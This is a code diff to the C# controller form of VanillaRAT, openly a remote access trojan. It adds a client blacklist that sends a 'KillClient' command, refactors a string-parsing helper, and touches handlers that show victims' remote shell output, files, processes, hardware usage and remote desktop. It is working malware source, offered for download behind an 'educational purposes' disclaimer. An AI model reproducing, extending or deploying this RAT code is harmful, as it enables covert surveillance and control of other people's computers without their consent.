@@ -34,6 +34,7 @@ namespace VanillaRat
             lblStatus.Text = "Offline";
             GetDataLoop.Interval = ServerUpdateInterval;
             TempDataHelper.CanUpload = true;
+            
         }
 
         #region Declarations
@@ -79,6 +80,18 @@ namespace VanillaRat
             return "Client";
         }
 
+        //Substring Function By Artful Hacker
+        public static string GetSubstringByString(string a, string b, string c)
+        {
+            try
+            {
+                return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
+            }
+            catch { }
+
+            return "";
+        }
+
         #endregion Extra
 
         #region Server Controls
@@ -86,22 +99,22 @@ namespace VanillaRat
         //Starts Server
         private void btnStartServer_Click(object sender, EventArgs e)
         {
-            if (!MainServer.Active)
-                try
-                {
-                    int Port = Settings.GetPort();
-                    MainServer.Start(Port);
-                    lblStatus.ForeColor = Color.Green;
-                    lblStatus.Text = "Online";
-                    Text = "Vanilla Rat - Online (" + Port + ")";
-                    GetDataLoop.Start();
-                    MessageBox.Show("Server started on port " + Port + ".", "Server Started", MessageBoxButtons.OK,
-                        MessageBoxIcon.Information);
-                }
-                catch (Exception EX)
-                {
-                    MessageBox.Show("Error: " + EX.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                }
+            if (MainServer.Active) return;
+            try
+            {
+                int Port = Settings.GetPort();
+                MainServer.Start(Port);
+                lblStatus.ForeColor = Color.Green;
+                lblStatus.Text = "Online";
+                Text = "Vanilla Rat - Online (" + Port + ")";
+                GetDataLoop.Start();
+                MessageBox.Show("Server started on port " + Port + ".", "Server Started", MessageBoxButtons.OK,
+                    MessageBoxIcon.Information);
+            }
+            catch (Exception EX)
+            {
+                MessageBox.Show("Error: " + EX.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
         }
 
         //Stops Server
@@ -188,16 +201,33 @@ namespace VanillaRat
         #region Data Handler
 
         //Gets all data that has been sent to the server and handles it
-        public void GetRecievedData()
+        public async void GetRecievedData()
         {
             Message Data;
             while (MainServer.GetNextMessage(out Data))
                 switch (Data.eventType)
                 {
                     case EventType.Connected:
+                        string ClientAddress = MainServer.GetClientAddress(Data.connectionId);                       
+                        
+                        foreach (string BlockedConnection in lbBlackList.Items)
+                        {
+                            if (ClientAddress == BlockedConnection)
+                            {
+                                MainServer.Send(Data.connectionId, Encoding.ASCII.GetBytes("KillClient"));
+                                await Task.Delay(50);
+                                try
+                                {
+                                    MainServer.Disconnect(Data.connectionId);
+                                } catch { }
+
+                            }
+                            
+                        }
+
                         lbConnectedClients.Items.Add(new ListViewItem(new[]
                         {
-                            Data.connectionId.ToString(), MainServer.GetClientAddress(Data.connectionId), "N/A", "N/A",
+                            Data.connectionId.ToString(), ClientAddress, "N/A", "N/A",
                             "N/A"
                         }));
                         break;
@@ -222,7 +252,6 @@ namespace VanillaRat
         public void HandleData(int ConnectionId, byte[] RawData)
         {
             ClientRunningApps CRA;
-            string ASCIIForm = Encoding.ASCII.GetString(RawData);
             byte[] ToProcess = RawData.Skip(1).ToArray();
             //Process type of data
             switch (RawData[0])
@@ -313,7 +342,6 @@ namespace VanillaRat
                 case 18: //Remote Shell Type
                     UpdateRemoteShell(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                     break;
-
             }
         }
 
@@ -430,10 +458,10 @@ namespace VanillaRat
             foreach (HardwareUsageViewer HUV in Application.OpenForms.OfType<HardwareUsageViewer>())
                 if (HUV.Visible && HUV.ConnectionID == ConnectionId && HUV.Update)
                 {
-                    double CPUUsageRaw = Convert.ToDouble(Functions.GetSubstringByString("{", "}", UsageData));
+                    double CPUUsageRaw = Convert.ToDouble(GetSubstringByString("{", "}", UsageData));
                     string CPUUsageString = Convert.ToInt32(CPUUsageRaw).ToString();
-                    string RamAmount = Functions.GetSubstringByString("[", "]", UsageData);
-                    double DiskUsageRaw = Convert.ToDouble(Functions.GetSubstringByString("<", ">", UsageData));
+                    string RamAmount = GetSubstringByString("[", "]", UsageData);
+                    double DiskUsageRaw = Convert.ToDouble(GetSubstringByString("<", ">", UsageData));
                     string DiskUsageString = Convert.ToInt32(DiskUsageRaw).ToString();
                     HUV.txtAvailableRam.Text = RamAmount;
                     HUV.txtCpuUsage.Text = CPUUsageString;
@@ -443,10 +471,10 @@ namespace VanillaRat
 
             if (HUV.Visible && HUV.Text == "Hardware Usage Viewer - " + ConnectionId)
             {
-                double CPUUsageRaw = Convert.ToDouble(Functions.GetSubstringByString("{", "}", UsageData));
+                double CPUUsageRaw = Convert.ToDouble(GetSubstringByString("{", "}", UsageData));
                 string CPUUsageString = Convert.ToInt32(CPUUsageRaw).ToString();
-                string RamAmount = Functions.GetSubstringByString("[", "]", UsageData);
-                double DiskUsageRaw = Convert.ToDouble(Functions.GetSubstringByString("<", ">", UsageData));
+                string RamAmount = GetSubstringByString("[", "]", UsageData);
+                double DiskUsageRaw = Convert.ToDouble(GetSubstringByString("<", ">", UsageData));
                 string DiskUsageString = Convert.ToInt32(DiskUsageRaw).ToString();
                 HUV.txtAvailableRam.Text = RamAmount;
                 HUV.txtCpuUsage.Text = CPUUsageString;
@@ -503,9 +531,9 @@ namespace VanillaRat
                     FE.lbFiles.Items.Clear();
                     foreach (string S in FilesArray)
                     {
-                        string Filename = Functions.GetSubstringByString("{", "}", S);
-                        string Extension = Functions.GetSubstringByString("<", ">", S);
-                        string DateCreated = Functions.GetSubstringByString("[", "]", S);
+                        string Filename = GetSubstringByString("{", "}", S);
+                        string Extension = GetSubstringByString("<", ">", S);
+                        string DateCreated = GetSubstringByString("[", "]", S);
                         string[] ToAdd = {Filename, Extension, DateCreated};
                         var ListItem = new ListViewItem(ToAdd);
                         FE.lbFiles.Items.Add(ListItem);
@@ -523,9 +551,9 @@ namespace VanillaRat
                 FE.lbFiles.Items.Clear();
                 foreach (string S in FilesArray)
                 {
-                    string Filename = Functions.GetSubstringByString("{", "}", S);
-                    string Extension = Functions.GetSubstringByString("<", ">", S);
-                    string DateCreated = Functions.GetSubstringByString("[", "]", S);
+                    string Filename = GetSubstringByString("{", "}", S);
+                    string Extension = GetSubstringByString("<", ">", S);
+                    string DateCreated = GetSubstringByString("[", "]", S);
                     string[] ToAdd = {Filename, Extension, DateCreated};
                     var ListItem = new ListViewItem(ToAdd);
                     FE.lbFiles.Items.Add(ListItem);
@@ -572,9 +600,9 @@ namespace VanillaRat
                     CRA.lbRunningProcesses.Items.Clear();
                     foreach (string S in ProcessesArray)
                     {
-                        string PName = Functions.GetSubstringByString("{", "}", S);
-                        string PID = Functions.GetSubstringByString("<", ">", S);
-                        string PWindow = Functions.GetSubstringByString("[", "]", S);
+                        string PName = GetSubstringByString("{", "}", S);
+                        string PID = GetSubstringByString("<", ">", S);
+                        string PWindow = GetSubstringByString("[", "]", S);
                         string[] ToAdd = {PName, PID, PWindow};
                         var ListItem = new ListViewItem(ToAdd);
                         CRA.lbRunningProcesses.Items.Add(ListItem);
@@ -592,9 +620,9 @@ namespace VanillaRat
                 CRA.lbRunningProcesses.Items.Clear();
                 foreach (string S in ProcessesArray)
                 {
-                    string PName = Functions.GetSubstringByString("{", "}", S);
-                    string PID = Functions.GetSubstringByString("<", ">", S);
-                    string PWindow = Functions.GetSubstringByString("[", "]", S);
+                    string PName = GetSubstringByString("{", "}", S);
+                    string PID = GetSubstringByString("<", ">", S);
+                    string PWindow = GetSubstringByString("[", "]", S);
                     string[] ToAdd = {PName, PID, PWindow};
                     var ListItem = new ListViewItem(ToAdd);
                     CRA.lbRunningProcesses.Items.Add(ListItem);
@@ -621,6 +649,22 @@ namespace VanillaRat
             DialogResult DR = MessageBox.Show(
                 "I, the creator, am in no way responsible for any actions that you may make using this software. You take full responsibility with any action taken using this software. Please take note that this application was designed for educational purposes and should never be used maliciously. By downloading the software or source to the software, you automatically accept this agreement.",
                 "Agreement", MessageBoxButtons.OKCancel, MessageBoxIcon.None);
+            if (DR == DialogResult.Cancel)
+                Close();
+            MessageBox.Show(
+                "NOTICE: This will be the last version of VanillaRAT! After v1.7, this program will no longer be updated. I am working on a new RAT called PhotonRAT, it will be much more stable, faster, and safer to use. Please pay attention for updates and news on Photon. - Daniel Huinda, Developer of VanillaRAT",
+                "IMPORTANT NOTICE", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
+            if (File.Exists("BlockedConnections.txt"))
+            {
+                using (StreamReader SR = new StreamReader("BlockedConnections.txt"))
+                {
+                    string Line;
+                    while ((Line = SR.ReadLine()) != null)
+                    {
+                        lbBlackList.Items.Add(Line);
+                    }
+                }
+            }
         }
 
         //Fade form in
@@ -639,6 +683,10 @@ namespace VanillaRat
         private void Main_FormClosing(object sender, FormClosingEventArgs e)
         {
             MainServer.Stop();
+            StringBuilder SB = new StringBuilder();
+            foreach (string S in lbBlackList.Items)
+                SB.AppendLine(S);
+            File.WriteAllText("BlockedConnections.txt", SB.ToString());
         }
 
         //Prevents column size changing
@@ -658,6 +706,47 @@ namespace VanillaRat
                 lblCurrentID.Text = "Client ID: " + CurrentSelectedID;
             }
             catch { }
+        }
+
+        //On black list drag over
+        private void OnBlacklistEnter(object sender, DragEventArgs e)
+        {
+            if (e.Data.GetDataPresent(typeof(ListViewItem)))
+                e.Effect = DragDropEffects.Move;
+
+        }
+
+        //On black list drag drop
+        private void OnBlacklistDrop(object sender, DragEventArgs e)
+        {
+            if (e.Data.GetDataPresent(typeof(ListViewItem)))
+            {
+                
+
+                ListViewItem LVI = (ListViewItem) e.Data.GetData(typeof(ListViewItem));
+                DialogResult DR = MessageBox.Show("Are you sure you would like to block " + LVI.SubItems[1].Text + "? This will kill the current connection.",
+                    "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
+                if (DR != DialogResult.Yes) return;
+                if (!lbBlackList.Items.Contains(LVI.SubItems[1].Text))
+                    lbBlackList.Items.Add(LVI.SubItems[1].Text);
+                MainServer.Send(Convert.ToInt16(LVI.SubItems[0].Text), Encoding.ASCII.GetBytes("KillClient"));
+            }
+        }
+
+        //On client drag
+        private void OnClientDrag(object sender, ItemDragEventArgs e)
+        {
+            DoDragDrop(e.Item, DragDropEffects.Move);
+        }
+
+        //Check if delete key was pressed on black list
+        private void OnBlacklistKeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Delete)
+            {
+                lbBlackList.Items.Remove(lbBlackList.SelectedItem);
+            }
+                
         }
 
         #endregion Form
@@ -1119,7 +1208,7 @@ namespace VanillaRat
         }
 
         //Update picture box image
-        private async void bwUpdateImage_DoWork(object sender, DoWorkEventArgs e)
+        private void bwUpdateImage_DoWork(object sender, DoWorkEventArgs e)
         {
             while (RDActive)
                 try
@@ -1146,11 +1235,12 @@ namespace VanillaRat
                             RDC.pbDesktop.Image = DEST;
                     }
 
-                    await Task.Delay(15);
+                    
                 }
                 catch { }
         }
+   
+        #endregion Remote Desktop                                               
 
-        #endregion Remote Desktop                                        
     }
 }
